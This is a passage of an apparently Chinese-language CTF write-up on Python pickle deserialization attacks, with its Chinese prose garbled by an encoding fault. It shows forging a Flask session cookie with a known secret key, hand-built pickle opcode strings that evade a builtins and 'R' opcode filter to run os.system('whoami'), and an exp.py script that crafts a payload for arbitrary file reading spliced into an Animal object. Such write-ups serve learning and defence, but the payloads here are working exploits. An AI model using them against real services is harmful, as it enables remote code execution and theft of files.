&lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;xxxxxxxxxxxxxx&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>cookieçš„ç”Ÿæˆå°±æ˜¯flask_session_cookie_managerä¸€æŠŠæ¢­äº†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ python3 flask_session_cookie_manager3.py encode -s &lt;span style="color:#d88200">&amp;#39;y0u-wi11_neuer_kn0vv-!@#se%32&amp;#39;&lt;/span> -t &lt;span style="color:#d88200">&amp;#39;{&amp;#34;data&amp;#34;: &amp;#34;xxxxb64_contentxxxx&amp;#34;, &amp;#34;username&amp;#34;: &amp;#34;adminadmin&amp;#34;}&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>â€”â€”â€”â€”å¦‚æœæŒ‰ç…§é¢˜ç›®åŸæœ‰çš„æ„æ€ï¼Œé™åˆ¶&lt;code>builtins&lt;/code>+&lt;code>b'R'&lt;/code>æ“ä½œç ä¹Ÿæ˜¯å¾ˆå¥½åšå‡ºæ¥çš„&lt;/p>
&lt;p>å…ˆç”¨pkerç”Ÿæˆå¸¦Rçš„opcode&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">getattr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;getattr&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">dict&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;dict&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">dict_get&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;get&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">globals&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;globals&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">builtins&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">globals&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">__builtins__&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">dict_get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">builtins&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">eval&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__builtins__&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__(&amp;#34;os&amp;#34;).system(&amp;#34;whoami&amp;#34;)&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span>
&lt;span style="color:#75715e"># b&amp;#39;cbuiltins\ngetattr\np0\n0cbuiltins\ndict\np1\n0g0\n(g1\nS\&amp;#39;get\&amp;#39;\ntRp2\n0cbuiltins\nglobals\np3\n0g3\n(tRp4\n0g2\n(g4\nS\&amp;#39;__builtins__\&amp;#39;\ntRp5\n0g0\n(g5\nS\&amp;#39;eval\&amp;#39;\ntRp6\n0g6\n(S\&amp;#39;__import__(&amp;#34;os&amp;#34;).system(&amp;#34;whoami&amp;#34;)\&amp;#39;\ntR.&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç„¶åæ‰‹æ“ï¼Œåœ¨è°ƒç”¨callableå‰æ·»åŠ MARKå³&lt;code>(&lt;/code>ï¼Œå»æ‰&lt;code>t&lt;/code>å’Œè°ƒç”¨&lt;code>t&lt;/code>ç”¨åˆ°çš„MARK&lt;/p>
&lt;p>ä¹Ÿå°±æ˜¯&lt;code>[callable] [tuple] R===&amp;gt;MARK [callable] [args...] o&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>b'''cbuiltins\ngetattr\np0\n0cbuiltins\ndict\np1\n0(g0\ng1\nS'get'\nop2\n0cbuiltins\nglobals\np3\n0(g3\nop4\n0(g2\ng4\nS'__builtins__'\nop5\n0(g0\ng5\nS'eval'\nop6\n0(g6\nS'__import__(&amp;quot;os&amp;quot;).system(&amp;quot;whoami&amp;quot;)'\no.'''
&lt;/code>&lt;/pre>&lt;p>å¯ä»¥çœ‹ä¸‹åŒºåˆ«&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024165337816.png" alt="image-20211024165337816">&lt;/p>
&lt;p>ä¿®æ”¹éƒ½æ˜¯ä¸€å¯¹ä¸€å¯¹çš„ï¼Œ&lt;strong>æ€»ç»“ä¸€ä¸‹æ–¹æ³•å°±æ˜¯&lt;code>0gx&lt;/code>è¦å˜ä¸º&lt;code>0(gx&lt;/code>ï¼Œ&lt;code>(gx&lt;/code>è¦å˜ä¸º&lt;code>gx&lt;/code> ï¼Œ&lt;code>tR&lt;/code>æ¢æˆ&lt;code>o&lt;/code>&lt;/strong>&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://miaotony.xyz/2021/08/07/CTF_2021dianfengjike/#toc-heading-6">wp&lt;/a>&lt;/p>
&lt;/details>
&lt;h3 id="--ä½¿ç”¨_getattributeload_objload_instå®ç°ä»»æ„æ–‡ä»¶è¯»å–">&amp;ndash;&amp;raquo;ä½¿ç”¨&lt;code>_getattribute()&lt;/code>&amp;amp;&lt;code>load_obj()&lt;/code>&amp;amp;&lt;code>load_inst()&lt;/code>å®ç°ä»»æ„æ–‡ä»¶è¯»å–&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;code>find_class()&lt;/code>&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">find_class&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#75715e"># Subclasses may override this.&lt;/span>
&lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">audit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;pickle.find_class&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">proto&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">fix_imports&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">_compat_pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">NAME_MAPPING&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">_compat_pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">NAME_MAPPING&lt;/span>&lt;span style="color:#111">[(&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">)]&lt;/span>
&lt;span style="color:#00a8c8">elif&lt;/span> &lt;span style="color:#111">module&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">_compat_pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">IMPORT_MAPPING&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">module&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">_compat_pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">IMPORT_MAPPING&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">__import__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">level&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">proto&lt;/span> &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">_getattribute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">modules&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">getattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">modules&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;code>_getattribute()&lt;/code>&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">_getattribute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">subpath&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">split&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;.&amp;#39;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">subpath&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;locals&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">raise&lt;/span> &lt;span style="color:#75af00">AttributeError&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Can&amp;#39;t get local attribute &lt;/span>&lt;span style="color:#d88200">{!r}&lt;/span>&lt;span style="color:#d88200"> on &lt;/span>&lt;span style="color:#d88200">{!r}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>
&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">parent&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">obj&lt;/span>
&lt;span style="color:#111">obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">subpath&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span> &lt;span style="color:#75af00">AttributeError&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">raise&lt;/span> &lt;span style="color:#75af00">AttributeError&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Can&amp;#39;t get attribute &lt;/span>&lt;span style="color:#d88200">{!r}&lt;/span>&lt;span style="color:#d88200"> on &lt;/span>&lt;span style="color:#d88200">{!r}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>
&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">None&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">parent&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;code>read()&lt;/code>&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">fin&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">fin&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>ä»ç„¶ä»¥ä¸Šé¢webtmp(ç©¶æç¼åˆæ€ª)çš„é¢˜ä¸ºä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¸Šé¢çš„å‡½æ•°ï¼Œåˆ›å»ºä¸€ä¸ªAnimalçš„å®ä¾‹ï¼Œç„¶åå°†nameæˆ–categoryçš„å€¼è®¾ç½®ä¸ºread wrapperçš„è¿”å›å€¼&lt;/p>
&lt;p>exp.py&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">struct&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">fin&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">fin&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">exploit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">payload_prefix&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;(&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">payload_body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;X&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">bytes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">struct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pack&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;I&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">)))&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">bytes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;utf-8&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">payload_suffix&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;i__main__&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">read&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">.&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload_prefix&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">payload_body&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">payload_suffix&lt;/span>
&lt;span style="color:#00a8c8">assert&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;R&amp;#39;&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">payload&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">payload&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">exploit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;flag&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Payload:&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># b&amp;#39;(X\x04\x00\x00\x00flagi__main__\nread\n.&amp;#39;&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Length:&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Base64:&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">main&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811193545692.png" alt="image-20210811193545692">&lt;/p>
&lt;p>å†æŠŠè¿™ä¸€éƒ¨åˆ†çš„payloadç¼åˆåˆ°åˆ›å»ºAnimalå®ä¾‹çš„Opcodeä¸­å»&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># åŸ: name=&amp;#39;x&amp;#39;,category=&amp;#39;y&amp;#39;&lt;/span>
&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x80\x03&lt;/span>&lt;span style="color:#d88200">c__main__&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">Animal&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x00&lt;/span>&lt;span style="color:#d88200">)&lt;/span>&lt;span style="color:#8045ff">\x81&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">}q&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">(X&lt;/span>&lt;span style="color:#8045ff">\x04\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">nameq&lt;/span>&lt;span style="color:#8045ff">\x03&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">xq&lt;/span>&lt;span style="color:#8045ff">\x04&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x08\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">categoryq&lt;/span>&lt;span style="color:#8045ff">\x05&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">yq&lt;/span>&lt;span style="color:#8045ff">\x06&lt;/span>&lt;span style="color:#d88200">ub.&amp;#39;&lt;/span>
&lt;span style="color:#75715e"># ç¼åˆ åº”è¯¥èƒ½çœ‹å‡ºæ¥æ”¹åœ¨å“ªé‡Œäº†&lt;/span>
&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x80\x03&lt;/span>&lt;span style="color:#d88200">c__main__&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">Animal&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x00&lt;/span>&lt;span style="color:#d88200">)&lt;/span>&lt;span style="color:#8045ff">\x81&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">}q&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">(X&lt;/span>&lt;span style="color:#8045ff">\x04\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">nameq&lt;/span>&lt;span style="color:#8045ff">\x03&lt;/span>&lt;span style="color:#d88200">(X&lt;/span>&lt;span style="color:#8045ff">\x04\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">flagi__main__&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">read&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x04&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x08\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">categoryq&lt;/span>&lt;span style="color:#8045ff">\x05&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">yq&lt;/span>&lt;span style="color:#8045ff">\x06&lt;/span>&lt;span style="color:#d88200">ub.&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811195932427.png" alt="image-20210811195932427">&lt;/p>
